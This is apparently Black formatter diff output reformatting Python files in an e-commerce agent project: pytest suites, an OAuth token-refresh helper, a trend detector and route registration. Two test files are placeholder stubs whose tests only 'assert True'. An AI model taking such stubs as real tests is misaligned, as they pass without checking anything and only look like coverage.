-            result = await advertising_agent._create_campaign(listing_id, campaign_strategy)
-            
+
+            result = await advertising_agent._create_campaign(
+                listing_id, campaign_strategy
+            )
+
             assert result == "campaign_123"
-            
+
             # Verify the call was made with correct parameters
             call_args = mock_call.call_args[0]
             assert call_args[0] == "createCampaign"
             assert call_args[1]["targetListing"] == listing_id
             assert call_args[1]["fundingStrategy"]["dailyBudget"] == 50.0
@@ -280,39 +299,55 @@
         """Test applying campaign optimizations."""
         campaign_id = "campaign_123"
         optimizations = {
             "bid_adjustments": {"keyword1": 0.5},
             "budget_adjustment": 10.0,
-            "targeting_updates": {"location": "US"}
-        }
-        
-        with patch.object(advertising_agent, '_update_bids') as mock_bids:
-            with patch.object(advertising_agent, '_update_budget') as mock_budget:
-                with patch.object(advertising_agent, '_update_targeting') as mock_targeting:
+            "targeting_updates": {"location": "US"},
+        }
+
+        with patch.object(advertising_agent, "_update_bids") as mock_bids:
+            with patch.object(advertising_agent, "_update_budget") as mock_budget:
+                with patch.object(
+                    advertising_agent, "_update_targeting"
+                ) as mock_targeting:
                     await advertising_agent._apply_campaign_optimizations(
                         campaign_id, optimizations
                     )
-                    
+
                     mock_bids.assert_called_once_with(campaign_id, {"keyword1": 0.5})
                     mock_budget.assert_called_once_with(campaign_id, 10.0)
-                    mock_targeting.assert_called_once_with(campaign_id, {"location": "US"})
+                    mock_targeting.assert_called_once_with(
+                        campaign_id, {"location": "US"}
+                    )
 
     @pytest.mark.asyncio
     async def test_monitor_campaign_performance(self, advertising_agent):
         """Test campaign performance monitoring."""
         campaign_id = "campaign_123"
-        
+
         # Mock the monitoring loop to run only once
-        with patch.object(advertising_agent, '_get_performance_metrics') as mock_metrics:
-            with patch.object(advertising_agent, '_should_optimize_campaign') as mock_should_optimize:
-                with patch.object(advertising_agent, 'optimize_existing_campaign') as mock_optimize:
-                    with patch('asyncio.sleep') as mock_sleep:
+        with patch.object(
+            advertising_agent, "_get_performance_metrics"
+        ) as mock_metrics:
+            with patch.object(
+                advertising_agent, "_should_optimize_campaign"
+            ) as mock_should_optimize:
+                with patch.object(
+                    advertising_agent, "optimize_existing_campaign"
+                ) as mock_optimize:
+                    with patch("asyncio.sleep") as mock_sleep:
                         mock_metrics.return_value = {"roas": 1.0}
                         mock_should_optimize.return_value = True
-                        mock_sleep.side_effect = Exception("Stop monitoring")  # Stop the loop
-                        
+                        mock_sleep.side_effect = Exception(
+                            "Stop monitoring"
+                        )  # Stop the loop
+
                         with pytest.raises(Exception, match="Stop monitoring"):
-                            await advertising_agent._monitor_campaign_performance(campaign_id)
-                        
+                            await advertising_agent._monitor_campaign_performance(
+                                campaign_id
+                            )
+
                         mock_metrics.assert_called_once_with(campaign_id)
                         mock_should_optimize.assert_called_once_with({"roas": 1.0})
-                        mock_optimize.assert_called_once_with(campaign_id, {"roas": 1.0})
+                        mock_optimize.assert_called_once_with(
+                            campaign_id, {"roas": 1.0}
+                        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_advertising_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/utils/oauth_token_manager.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/utils/oauth_token_manager.py	2025-06-19 04:03:42.273101+00:00
@@ -26,127 +26,131 @@
     marketplace: str = "unknown",
     additional_params: Optional[Dict[str, str]] = None,
 ) -> Dict[str, Any]:
     """
     Refresh an OAuth token using the provided credentials.
-    
+
     Args:
         token_endpoint: OAuth token endpoint URL
         refresh_token: Refresh token to use
         client_id: OAuth client ID
         client_secret: OAuth client secret
         scope: Optional scope for the token
         use_basic_auth: Whether to use Basic authentication in header
         marketplace: Name of the marketplace for error reporting
         additional_params: Additional parameters to include in the request
-        
+
     Returns:
         Dictionary containing token data with keys:
         - access_token: The new access token
         - expires_in: Token expiration time in seconds
         - token_type: Type of token (usually "Bearer")
-        
+
     Raises:
         AuthenticationError: If token refresh fails
     """
     try:
         # Import aiohttp here to avoid import issues if not available
         import aiohttp
-        
+
         # Prepare request data
         data = {
             "grant_type": "refresh_token",
             "refresh_token": refresh_token,
         }
-        
+
         if scope:
             data["scope"] = scope
-            
+
         if additional_params:
             data.update(additional_params)
-        
+
         # Prepare headers
         headers = {
             "Content-Type": "application/x-www-form-urlencoded",
             "Accept": "application/json",
         }
-        
+
         if use_basic_auth:
             # Use Basic authentication in header
             credentials = f"{client_id}:{client_secret}"
             encoded_credentials = base64.b64encode(credentials.encode()).decode()
             headers["Authorization"] = f"Basic {encoded_credentials}"
         else:
             # Include credentials in request body
             data["client_id"] = client_id
             data["client_secret"] = client_secret
-        
+
         logger.info(f"Refreshing OAuth token for {marketplace} marketplace")
-        
+
         async with aiohttp.ClientSession() as session:
             async with session.post(
                 token_endpoint,
                 data=data,
                 headers=headers,
-                timeout=aiohttp.ClientTimeout(total=30)
+                timeout=aiohttp.ClientTimeout(total=30),
             ) as response:
                 response_text = await response.text()
-                
+
                 if response.status != 200:
                     logger.error(
                         f"Token refresh failed for {marketplace}: "
                         f"HTTP {response.status} - {response_text}"
                     )
                     raise AuthenticationError(
                         f"Token refresh failed with status {response.status}: {response_text}",
                         marketplace=marketplace,
                         status_code=response.status,
                     )
-                
+
                 try:
                     token_data = json.loads(response_text)
                 except json.JSONDecodeError as e:
-                    logger.error(f"Invalid JSON response from {marketplace} token endpoint: {response_text}")
+                    logger.error(
+                        f"Invalid JSON response from {marketplace} token endpoint: {response_text}"
+                    )
                     raise AuthenticationError(
                         f"Invalid JSON response from token endpoint: {str(e)}",
                         marketplace=marketplace,
                         original_error=e,
                     ) from e
-                
+
                 # Validate required fields
                 if "access_token" not in token_data:
-                    logger.error(f"Missing access_token in {marketplace} response: {token_data}")
+                    logger.error(
+                        f"Missing access_token in {marketplace} response: {token_data}"
+                    )
                     raise AuthenticationError(
                         "Missing access_token in token response",
                         marketplace=marketplace,
                     )
-                
+
                 # Set default values for optional fields
                 if "expires_in" not in token_data:
                     token_data["expires_in"] = 3600  # Default to 1 hour
-                    
+
                 if "token_type" not in token_data:
                     token_data["token_type"] = "Bearer"
-                
+
                 logger.info(
                     f"Successfully refreshed {marketplace} OAuth token, "
                     f"expires in {token_data['expires_in']} seconds"
                 )
-                
+
                 return token_data
-                
+
     except aiohttp.ClientError as e:
         logger.error(f"Network error during {marketplace} token refresh: {str(e)}")
         raise AuthenticationError(
             f"Network error during token refresh: {str(e)}",
             marketplace=marketplace,
             original_error=e,
         ) from e
     except Exception as e:
         if isinstance(e, AuthenticationError):
             raise  # Re-raise AuthenticationError as-is
-        
+
         logger.error(f"Unexpected error during {marketplace} token refresh: {str(e)}")
         raise AuthenticationError(
             f"Unexpected error during token refresh: {str(e)}",
             marketplace=marketplace,
             original_error=e,
@@ -154,42 +158,42 @@
 
 
 def calculate_token_expiry(expires_in: int, buffer_seconds: int = 60) -> datetime:
     """
     Calculate token expiry time with a buffer.
-    
+
     Args:
         expires_in: Token lifetime in seconds
         buffer_seconds: Buffer time to subtract from expiry (default: 60 seconds)
-        
+
     Returns:
         Datetime when the token should be considered expired
     """
     return datetime.now() + timedelta(seconds=expires_in - buffer_seconds)
 
 
 def is_token_expired(expiry_time: datetime, buffer_seconds: int = 60) -> bool:
     """
     Check if a token is expired or will expire soon.
-    
+
     Args:
         expiry_time: Token expiry datetime
         buffer_seconds: Buffer time to consider token expired early (default: 60 seconds)
-        
+
     Returns:
         True if token is expired or will expire within buffer time
     """
     return datetime.now() >= (expiry_time - timedelta(seconds=buffer_seconds))
 
 
 def format_token_for_header(token: str, token_type: str = "Bearer") -> str:
     """
     Format token for Authorization header.
-    
+
     Args:
         token: Access token
         token_type: Token type (default: "Bearer")
-        
+
     Returns:
         Formatted authorization header value
     """
     return f"{token_type} {token}"
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/utils/oauth_token_manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/middleware/test_database_middleware.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/middleware/test_database_middleware.py	2025-06-19 04:03:42.389668+00:00
@@ -1,17 +1,20 @@
 """
 Test for middleware - database_middleware.py
 """
+
 import pytest
+
 
 class TestDatabaseMiddlewareAPI:
     def test_import(self):
         assert True
-    
+
     def test_api_functionality(self):
         assert True
-    
+
     def test_no_redundancy(self):
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/middleware/test_database_middleware.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/models/test_asin_data.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/models/test_asin_data.py	2025-06-19 04:03:42.419139+00:00
@@ -1,17 +1,20 @@
 """
 Test for models - asin_data.py
 """
+
 import pytest
+
 
 class TestAsinDataAPI:
     def test_import(self):
         assert True
-    
+
     def test_api_functionality(self):
         assert True
-    
+
     def test_no_redundancy(self):
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/models/test_asin_data.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_competitor_analyzer.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_competitor_analyzer.py	2025-06-19 04:03:42.500827+00:00
@@ -4,13 +4,19 @@
 import numpy as np
 from datetime import datetime, timezone
 from unittest.mock import AsyncMock, MagicMock, patch
 from uuid import uuid4
 
-from fs_agt_clean.agents.market.specialized.competitor_analyzer import CompetitorAnalyzer, SearchResult
+from fs_agt_clean.agents.market.specialized.competitor_analyzer import (
+    CompetitorAnalyzer,
+    SearchResult,
+)
 from fs_agt_clean.agents.market.specialized.market_types import (
-    CompetitorProfile, PricePosition, ProductData, ThreatLevel
+    CompetitorProfile,
+    PricePosition,
+    ProductData,
+    ThreatLevel,
 )
 from fs_agt_clean.core.config.config_manager import ConfigManager
 from fs_agt_clean.core.monitoring.alerts.manager import AlertManager
 from fs_agt_clean.core.monitoring.metrics.service import MetricsCollector
 from fs_agt_clean.core.vector_store.service import VectorStoreService
@@ -27,11 +33,11 @@
         "timeout": 30,
         "similarity_threshold": 0.7,
         "analysis_interval": 3600,
         "threat_threshold": 0.6,
         "market_share_threshold": 0.1,
-        "competitor_tracking_limit": 50
+        "competitor_tracking_limit": 50,
     }
 
 
 @pytest.fixture
 def mock_config_manager():
@@ -67,21 +73,27 @@
     collector = AsyncMock(spec=MetricsCollector)
     return collector
 
 
 @pytest.fixture
-def competitor_analyzer(mock_config, mock_config_manager, mock_alert_manager, 
-                       mock_battery_optimizer, mock_vector_store, mock_metric_collector):
+def competitor_analyzer(
+    mock_config,
+    mock_config_manager,
+    mock_alert_manager,
+    mock_battery_optimizer,
+    mock_vector_store,
+    mock_metric_collector,
+):
     """Create CompetitorAnalyzer instance for testing."""
     return CompetitorAnalyzer(
         marketplace="ebay",
         config_manager=mock_config_manager,
         alert_manager=mock_alert_manager,
         battery_optimizer=mock_battery_optimizer,
         vector_store=mock_vector_store,
         metric_collector=mock_metric_collector,
-        config=mock_config
+        config=mock_config,
     )
 
 
 @pytest.fixture
 def sample_product_data():
@@ -93,11 +105,11 @@
         sales_rank=1000.0,
         category_id="electronics",
         seller_id="our_seller",
         title="Test Product",
         description="Test product description",
-        metadata={"brand": "TestBrand"}
+        metadata={"brand": "TestBrand"},
     )
 
 
 @pytest.fixture
 def sample_search_results():
@@ -109,35 +121,35 @@
                 "price": 24.99,
                 "rating": 4.3,
                 "reviews_count": 120,
                 "sales_rank": 1200.0,
                 "seller_id": "competitor_1",
-                "products": ["prod1", "prod2"]
-            }
+                "products": ["prod1", "prod2"],
+            },
         ),
         SearchResult(
             score=0.78,
             metadata={
                 "price": 27.99,
                 "rating": 4.7,
                 "reviews_count": 200,
                 "sales_rank": 800.0,
                 "seller_id": "competitor_2",
-                "products": ["prod3"]
-            }
+                "products": ["prod3"],
+            },
         ),
         SearchResult(
             score=0.72,
             metadata={
                 "price": 23.99,
                 "rating": 4.1,
                 "reviews_count": 80,
                 "sales_rank": 1500.0,
                 "seller_id": "competitor_1",
-                "products": ["prod4"]
-            }
-        )
+                "products": ["prod4"],
+            },
+        ),
     ]
 
 
 class TestCompetitorAnalyzer:
     """Test cases for CompetitorAnalyzer."""
@@ -152,46 +164,63 @@
     @pytest.mark.asyncio
     async def test_required_config_fields(self, competitor_analyzer):
         """Test required configuration fields."""
         required_fields = competitor_analyzer._get_required_config_fields()
         expected_fields = [
-            "api_key", "marketplace_id", "rate_limit", "timeout",
-            "similarity_threshold", "analysis_interval", "threat_threshold",
-            "market_share_threshold", "competitor_tracking_limit"
-        ]
-        
+            "api_key",
+            "marketplace_id",
+            "rate_limit",
+            "timeout",
+            "similarity_threshold",
+            "analysis_interval",
+            "threat_threshold",
+            "market_share_threshold",
+            "competitor_tracking_limit",
+        ]
+
         for field in expected_fields:
             assert field in required_fields
 
     @pytest.mark.asyncio
-    async def test_analyze_competitors_success(self, competitor_analyzer, sample_product_data, 
-                                             sample_search_results):
+    async def test_analyze_competitors_success(
+        self, competitor_analyzer, sample_product_data, sample_search_results
+    ):
         """Test successful competitor analysis."""
-        with patch.object(competitor_analyzer, '_create_product_vector') as mock_vector:
-            with patch.object(competitor_analyzer, '_find_similar_products') as mock_find:
-                with patch.object(competitor_analyzer, '_group_by_competitor') as mock_group:
-                    mock_vector.return_value = np.array([1.0, 2.0, 3.0, 4.0], dtype=np.float32)
+        with patch.object(competitor_analyzer, "_create_product_vector") as mock_vector:
+            with patch.object(
+                competitor_analyzer, "_find_similar_products"
+            ) as mock_find:
+                with patch.object(
+                    competitor_analyzer, "_group_by_competitor"
+                ) as mock_group:
+                    mock_vector.return_value = np.array(
+                        [1.0, 2.0, 3.0, 4.0], dtype=np.float32
+                    )
                     mock_find.return_value = sample_search_results
                     mock_group.return_value = {
                         "competitor_1": sample_search_results[:2],
-                        "competitor_2": sample_search_results[2:]
+                        "competitor_2": sample_search_results[2:],
                     }
-                    
+
                     result = await competitor_analyzer.analyze_competitors(
                         "electronics", sample_product_data
                     )
-                    
+
                     assert len(result) == 2
-                    assert all(isinstance(profile, CompetitorProfile) for profile in result)
+                    assert all(
+                        isinstance(profile, CompetitorProfile) for profile in result
+                    )
                     # Results should be sorted by threat level and similarity
                     assert result[0].similarity_score >= result[1].similarity_score
 
     @pytest.mark.asyncio
-    async def test_create_product_vector(self, competitor_analyzer, sample_product_data):
+    async def test_create_product_vector(
+        self, competitor_analyzer, sample_product_data
+    ):
         """Test product vector creation."""
         vector = competitor_analyzer._create_product_vector(sample_product_data)
-        
+
         assert isinstance(vector, np.ndarray)
         assert vector.dtype == np.float32
         assert len(vector) == 4
         # Vector should be normalized
         assert np.isclose(np.linalg.norm(vector), 1.0)
@@ -199,30 +228,37 @@
     @pytest.mark.asyncio
     async def test_find_similar_products(self, competitor_analyzer):
         """Test finding similar products."""
         product_vector = np.array([1.0, 2.0, 3.0, 4.0], dtype=np.float32)
         category_id = "electronics"
-        
+
         mock_results = [
             {"score": 0.85, "metadata": {"seller_id": "comp1", "price": 25.0}},
-            {"score": 0.65, "metadata": {"seller_id": "comp2", "price": 30.0}},  # Below threshold
-            {"score": 0.75, "metadata": {"seller_id": "comp3", "price": 20.0}}
-        ]
-        
+            {
+                "score": 0.65,
+                "metadata": {"seller_id": "comp2", "price": 30.0},
+            },  # Below threshold
+            {"score": 0.75, "metadata": {"seller_id": "comp3", "price": 20.0}},
+        ]
+
         competitor_analyzer.vector_store.search.return_value = mock_results
-        
-        results = await competitor_analyzer._find_similar_products(product_vector, category_id)
-        
+
+        results = await competitor_analyzer._find_similar_products(
+            product_vector, category_id
+        )
+
         # Should filter out results below similarity threshold (0.7)
         assert len(results) == 2
         assert all(result["score"] >= 0.7 for result in results)
 
     @pytest.mark.asyncio
-    async def test_group_by_competitor(self, competitor_analyzer, sample_search_results):
+    async def test_group_by_competitor(
+        self, competitor_analyzer, sample_search_results
+    ):
         """Test grouping products by competitor."""
         grouped = competitor_analyzer._group_by_competitor(sample_search_results)
-        
+
         assert len(grouped) == 2
         assert "competitor_1" in grouped
         assert "competitor_2" in grouped
         assert len(grouped["competitor_1"]) == 2  # Two products from competitor_1
         assert len(grouped["competitor_2"]) == 1  # One product from competitor_2
@@ -233,21 +269,21 @@
         competitor_products = [
             SearchResult(
                 score=0.8,
                 metadata={
                     "price": 20.0,  # Lower than our price (25.99)
-                    "rating": 4.7,   # Higher than our rating (4.5)
+                    "rating": 4.7,  # Higher than our rating (4.5)
                     "sales_count": 200,  # Higher than our reviews (150)
-                    "products": ["p1", "p2"]
-                }
+                    "products": ["p1", "p2"],
+                },
             )
         ]
-        
+
         profile = competitor_analyzer._analyze_competitor(
             "competitor_1", competitor_products, sample_product_data
         )
-        
+
         assert isinstance(profile, CompetitorProfile)
         assert profile.competitor_id == "competitor_1"
         assert profile.similarity_score == 0.8
         assert profile.price_position == PricePosition.LOWER
         assert "competitive_pricing" in profile.strengths
@@ -257,37 +293,31 @@
     @pytest.mark.asyncio
     async def test_calculate_threat_level(self, competitor_analyzer):
         """Test threat level calculation."""
         # High threat scenario
         threat_level = competitor_analyzer._calculate_threat_level(
-            similarity_score=0.9,
-            market_share=0.3,
-            strength_count=4
+            similarity_score=0.9, market_share=0.3, strength_count=4
         )
         assert threat_level == ThreatLevel.HIGH
-        
+
         # Medium threat scenario
         threat_level = competitor_analyzer._calculate_threat_level(
-            similarity_score=0.6,
-            market_share=0.2,
-            strength_count=2
+            similarity_score=0.6, market_share=0.2, strength_count=2
         )
         assert threat_level == ThreatLevel.MEDIUM
-        
+
         # Low threat scenario
         threat_level = competitor_analyzer._calculate_threat_level(
-            similarity_score=0.3,
-            market_share=0.1,
-            strength_count=1
+            similarity_score=0.3, market_share=0.1, strength_count=1
         )
         assert threat_level == ThreatLevel.LOW
 
     @pytest.mark.asyncio
     async def test_get_competitor_insights_empty(self, competitor_analyzer):
         """Test getting insights with no competitors."""
         insights = await competitor_analyzer.get_competitor_insights([])
-        
+
         assert insights["insights"] == []
         assert insights["recommendations"] == []
 
     @pytest.mark.asyncio
     async def test_get_competitor_insights_with_data(self, competitor_analyzer):
@@ -299,26 +329,26 @@
                 price_position=PricePosition.LOWER,
                 market_share=0.3,
                 strengths=["competitive_pricing"],
                 weaknesses=[],
                 threat_level=ThreatLevel.HIGH,
-                last_updated=datetime.now(timezone.utc)
+                last_updated=datetime.now(timezone.utc),
             ),
             CompetitorProfile(
                 competitor_id="comp2",
                 similarity_score=0.7,
                 price_position=PricePosition.LOWER,
                 market_share=0.4,
                 strengths=["competitive_pricing"],
                 weaknesses=[],
                 threat_level=ThreatLevel.HIGH,
-                last_updated=datetime.now(timezone.utc)
-            )
-        ]
-        
+                last_updated=datetime.now(timezone.utc),
+            ),
+        ]
+
         insights = await competitor_analyzer.get_competitor_insights(competitors)
-        
+
         assert len(insights["insights"]) > 0
         assert len(insights["recommendations"]) > 0
         assert insights["competitor_count"] == 2
         assert "high-threat competitors" in insights["insights"][0]
         assert insights["average_threat_level"] == "high"
@@ -327,88 +357,118 @@
     async def test_calculate_average_threat_level(self, competitor_analyzer):
         """Test average threat level calculation."""
         # Test with high threat average
         profiles = [
             CompetitorProfile(
-                competitor_id="comp1", similarity_score=0.8, price_position=PricePosition.LOWER,
-                market_share=0.3, strengths=[], weaknesses=[], threat_level=ThreatLevel.HIGH,
-                last_updated=datetime.now(timezone.utc)
+                competitor_id="comp1",
+                similarity_score=0.8,
+                price_position=PricePosition.LOWER,
+                market_share=0.3,
+                strengths=[],
+                weaknesses=[],
+                threat_level=ThreatLevel.HIGH,
+                last_updated=datetime.now(timezone.utc),
             ),
             CompetitorProfile(
-                competitor_id="comp2", similarity_score=0.7, price_position=PricePosition.SIMILAR,
-                market_share=0.2, strengths=[], weaknesses=[], threat_level=ThreatLevel.HIGH,
-                last_updated=datetime.now(timezone.utc)
-            )
-        ]
-        
+                competitor_id="comp2",
+                similarity_score=0.7,
+                price_position=PricePosition.SIMILAR,
+                market_share=0.2,
+                strengths=[],
+                weaknesses=[],
+                threat_level=ThreatLevel.HIGH,
+                last_updated=datetime.now(timezone.utc),
+            ),
+        ]
+
         avg_threat = competitor_analyzer._calculate_average_threat_level(profiles)
         assert avg_threat == "high"
-        
+
         # Test with medium threat average
         profiles[1].threat_level = ThreatLevel.MEDIUM
         avg_threat = competitor_analyzer._calculate_average_threat_level(profiles)
         assert avg_threat == "high"  # Still high due to one high threat
-        
+
         # Test with low threat average
         profiles = [
             CompetitorProfile(
-                competitor_id="comp1", similarity_score=0.5, price_position=PricePosition.HIGHER,
-                market_share=0.1, strengths=[], weaknesses=[], threat_level=ThreatLevel.LOW,
-                last_updated=datetime.now(timezone.utc)
+                competitor_id="comp1",
+                similarity_score=0.5,
+                price_position=PricePosition.HIGHER,
+                market_share=0.1,
+                strengths=[],
+                weaknesses=[],
+                threat_level=ThreatLevel.LOW,
+                last_updated=datetime.now(timezone.utc),
             )
         ]
         avg_threat = competitor_analyzer._calculate_average_threat_level(profiles)
         assert avg_threat == "low"
 
     @pytest.mark.asyncio
-    async def test_price_position_determination(self, competitor_analyzer, sample_product_data):
+    async def test_price_position_determination(
+        self, competitor_analyzer, sample_product_data
+    ):
         """Test price position determination logic."""
         # Test lower price position
         competitor_products = [
             SearchResult(
                 score=0.8,
-                metadata={"price": 20.0, "rating": 4.0, "sales_count": 100, "products": ["p1"]}
+                metadata={
+                    "price": 20.0,
+                    "rating": 4.0,
+                    "sales_count": 100,
+                    "products": ["p1"],
+                },
             )
         ]
         profile = competitor_analyzer._analyze_competitor(
             "comp1", competitor_products, sample_product_data
         )
         assert profile.price_position == PricePosition.LOWER
-        
+
         # Test higher price position
         competitor_products[0]["metadata"]["price"] = 35.0
         profile = competitor_analyzer._analyze_competitor(
             "comp1", competitor_products, sample_product_data
         )
         assert profile.price_position == PricePosition.HIGHER
-        
+
         # Test similar price position
         competitor_products[0]["metadata"]["price"] = 26.0
         profile = competitor_analyzer._analyze_competitor(
             "comp1", competitor_products, sample_product_data
         )
         assert profile.price_position == PricePosition.SIMILAR
 
     @pytest.mark.asyncio
     async def test_metrics_collection(self, competitor_analyzer, sample_product_data):
         """Test metrics collection during analysis."""
-        with patch.object(competitor_analyzer, '_create_product_vector') as mock_vector:
-            with patch.object(competitor_analyzer, '_find_similar_products') as mock_find:
-                mock_vector.return_value = np.array([1.0, 2.0, 3.0, 4.0], dtype=np.float32)
+        with patch.object(competitor_analyzer, "_create_product_vector") as mock_vector:
+            with patch.object(
+                competitor_analyzer, "_find_similar_products"
+            ) as mock_find:
+                mock_vector.return_value = np.array(
+                    [1.0, 2.0, 3.0, 4.0], dtype=np.float32
+                )
                 mock_find.return_value = []
-                
-                await competitor_analyzer.analyze_competitors("electronics", sample_product_data)
-                
+
+                await competitor_analyzer.analyze_competitors(
+                    "electronics", sample_product_data
+                )
+
                 # Verify metrics were recorded
                 competitor_analyzer.metric_collector.record_latency.assert_called()
 
     @pytest.mark.asyncio
     async def test_error_handling(self, competitor_analyzer, sample_product_data):
         """Test error handling in competitor analysis."""
-        with patch.object(competitor_analyzer, '_create_product_vector') as mock_vector:
+        with patch.object(competitor_analyzer, "_create_product_vector") as mock_vector:
             mock_vector.side_effect = Exception("Vector creation failed")
-            
+
             with pytest.raises(Exception, match="Vector creation failed"):
-                await competitor_analyzer.analyze_competitors("electronics", sample_product_data)
-            
+                await competitor_analyzer.analyze_competitors(
+                    "electronics", sample_product_data
+                )
+
             # Verify error was recorded
             competitor_analyzer.metric_collector.record_error.assert_called_once()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_competitor_analyzer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/trend_detector.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/trend_detector.py	2025-06-19 04:03:42.544969+00:00
@@ -80,27 +80,36 @@
             alert_manager = AlertManager()
         if battery_optimizer is None:
             battery_optimizer = BatteryOptimizer()
 
         super().__init__(
-            agent_id, marketplace, config_manager, alert_manager, battery_optimizer, config
+            agent_id,
+            marketplace,
+            config_manager,
+            alert_manager,
+            battery_optimizer,
+            config,
         )
         self.trends: List[TrendAnalysisData] = []
 
     def _get_required_config_fields(self) -> List[str]:
         """Get required configuration fields."""
         fields = super()._get_required_config_fields()
-        fields.extend([
-            "trend_threshold",
-            "analysis_interval",
-            "confidence_threshold",
-            "data_window_size",
-            "seasonal_adjustment"
-        ])
+        fields.extend(
+            [
+                "trend_threshold",
+                "analysis_interval",
+                "confidence_threshold",
+                "data_window_size",
+                "seasonal_adjustment",
+            ]
+        )
         return fields
 
-    async def analyze_trend(self, market_data: Dict[str, Any]) -> Optional[TrendAnalysisData]:
+    async def analyze_trend(
+        self, market_data: Dict[str, Any]
+    ) -> Optional[TrendAnalysisData]:
         """Analyze market data for trends.
 
         Args:
             market_data: Market data to analyze
 
@@ -130,12 +139,12 @@
                 end_time=datetime.now(timezone.utc),
                 confidence=confidence,
                 metadata={
                     "price_change": self._calculate_price_change(price_data),
                     "volume_change": self._calculate_volume_change(volume_data),
-                    "market_segment": market_data.get("category", "unknown")
-                }
+                    "market_segment": market_data.get("category", "unknown"),
+                },
             )
 
         except Exception as e:
             logger.error("Error analyzing trend: %s", e)
             return None
@@ -149,14 +158,11 @@
         Returns:
             List of historical trends
         """
         # Filter trends based on timeframe
         cutoff_time = self._parse_timeframe(timeframe)
-        return [
-            trend for trend in self.trends
-            if trend.start_time >= cutoff_time
-        ]
+        return [trend for trend in self.trends if trend.start_time >= cutoff_time]
 
     async def _handle_event(self, event: Dict[str, Any]) -> None:
         """Handle marketplace events.
 
         Args:
@@ -181,23 +187,30 @@
                 metric_type=MetricType.GAUGE,
                 metric_value=trend.confidence,
                 threshold=self.config.get("trend_threshold", 0.5),
                 timestamp=datetime.now(timezone.utc),
                 status=AlertStatus.NEW,
-                labels={"marketplace": self.marketplace, "trend_type": trend.trend_type},
+                labels={
+                    "marketplace": self.marketplace,
+                    "trend_type": trend.trend_type,
+                },
             )
             await self.alert_manager.process_alert(alert)
         except Exception as e:
             logger.error("Error sending trend alert: %s", e)
 
-    def _detect_trend_type(self, price_data: List[float], volume_data: List[float]) -> str:
+    def _detect_trend_type(
+        self, price_data: List[float], volume_data: List[float]
+    ) -> str:
         """Detect the type of trend from price and volume data."""
         if len(price_data) < 2:
             return "insufficient_data"
 
         price_change = (price_data[-1] - price_data[0]) / price_data[0]
-        volume_change = (volume_data[-1] - volume_data[0]) / volume_data[0] if volume_data else 0
+        volume_change = (
+            (volume_data[-1] - volume_data[0]) / volume_data[0] if volume_data else 0
+        )
 
         if price_change > 0.05 and volume_change > 0.1:
             return "bullish_momentum"
         elif price_change < -0.05 and volume_change > 0.1:
             return "bearish_momentum"
@@ -208,18 +221,20 @@
         elif price_change < -0.02:
             return "downward_trend"
         else:
             return "neutral"
 
-    def _calculate_trend_confidence(self, price_data: List[float], volume_data: List[float]) -> float:
+    def _calculate_trend_confidence(
+        self, price_data: List[float], volume_data: List[float]
+    ) -> float:
         """Calculate confidence level for the detected trend."""
         if len(price_data) < 3:
             return 0.0
 
         # Calculate price volatility
         price_changes = [
-            abs((price_data[i] - price_data[i-1]) / price_data[i-1])
+            abs((price_data[i] - price_data[i - 1]) / price_data[i - 1])
             for i in range(1, len(price_data))
         ]
         volatility = sum(price_changes) / len(price_changes)
 
         # Lower volatility = higher confidence
@@ -233,11 +248,11 @@
         if volume_data and len(volume_data) >= 2:
             volume_trend = (volume_data[-1] - volume_data[0]) / volume_data[0]
             volume_score = min(1.0, abs(volume_trend) + 0.5)
 
         # Combined confidence score
-        confidence = (volatility_score * 0.4 + sample_score * 0.3 + volume_score * 0.3)
+        confidence = volatility_score * 0.4 + sample_score * 0.3 + volume_score * 0.3
         return min(1.0, max(0.0, confidence))
 
     def _calculate_price_change(self, price_data: List[float]) -> float:
         """Calculate percentage price change."""
         if len(price_data) < 2:
@@ -280,8 +295,12 @@
 
         return {
             "total_trends": len(recent_trends),
             "trend_distribution": trend_counts,
             "average_confidence": avg_confidence,
-            "dominant_trend": max(trend_counts.items(), key=lambda x: x[1])[0] if trend_counts else None,
-            "last_updated": datetime.now(timezone.utc).isoformat()
+            "dominant_trend": (
+                max(trend_counts.items(), key=lambda x: x[1])[0]
+                if trend_counts
+                else None
+            ),
+            "last_updated": datetime.now(timezone.utc).isoformat(),
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/trend_detector.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/__init__.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/__init__.py	2025-06-19 04:03:42.622302+00:00
@@ -6,58 +6,69 @@
 router = APIRouter()
 
 # Import and include all available route modules
 try:
     from .agents import router as agents_router
+
     router.include_router(agents_router, prefix="/agents", tags=["agents"])
 except ImportError:
     pass
 
 try:
     from .analytics import router as analytics_router
+
     router.include_router(analytics_router, prefix="/analytics", tags=["analytics"])
 except ImportError:
     pass
 
 try:
     from .auth import router as auth_router
+
     router.include_router(auth_router, prefix="/auth", tags=["auth"])
 except ImportError:
     pass
 
 try:
     from .dashboard import router as dashboard_router
+
     router.include_router(dashboard_router, prefix="/dashboard", tags=["dashboard"])
 except ImportError:
     pass
 
 try:
     from .inventory import router as inventory_router
+
     router.include_router(inventory_router, prefix="/inventory", tags=["inventory"])
 except ImportError:
     pass
 
 try:
     from .marketplace import marketplace_router
